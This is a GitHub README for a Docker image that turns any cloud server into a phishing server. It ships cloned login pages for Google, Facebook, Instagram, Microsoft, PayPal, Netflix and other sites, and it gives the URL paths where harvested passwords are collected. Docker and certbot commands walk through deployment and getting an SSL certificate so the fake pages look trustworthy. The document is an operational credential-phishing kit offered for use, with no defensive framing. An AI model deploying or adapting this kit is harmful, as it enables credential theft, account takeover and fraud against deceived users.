# phishing_cloud
Doceker Image Build for using any Cloud Server or Computer as a Phishing server.
Docker Repo: https://hub.docker.com/r/insomniaccoder/phishing
Refer My Blog for usage : https://harshsinghvi.github.io/blog/is-cloud-a-tool-for-hackers/

* In this Docker image I have made installed many sites 
* for login page `https://<your_domain>/<sitename>.html`
* for passwords `https://<your_domain>/<sitename>.txt`
* for common passwords file `https://<your_domain>/raw.txt`
* for common login page `https://<your_domain>/index.html` or simply `https://<your_domain>`

### List of available sites
* google
* instagram
* facebook 
* microsoft
* linkedin
* netflix
* spotify
* paypal
* twitter
* instafollowers
* snapchat 
* more websites coming soon at my Docker Hub Repository.

## Usage
* Install docker image made my me (https://hub.docker.com/r/insomniaccoder/phishing)
```bash 
sudo docker pull insomniaccoder/phishing
sudo docker run -d -it --name phishing_demo -p 80:80 -p 443:443 insomniaccoder/phishing # I have made this image myself for you guys
```
Getting SSL Certificate
```bash 
sudo docker exec -it phishing_demo bash # connect to the container
ls # to see the installed sites in the container
certbot --apache --register-unsafely-without-email -d <your domain name> # complete the precess and you got the SSL certificate
```
## Build your own 
```bash
git clone https://github.com/harshsinghvi/phishing_cloud.git
cd phishing_cloud
docker -t <image_name> .
```
## Build Multi-Arch Images 
<a href="https://mirailabs.io/blog/multiarch-docker-with-buildx/"> Refer this guide </a>
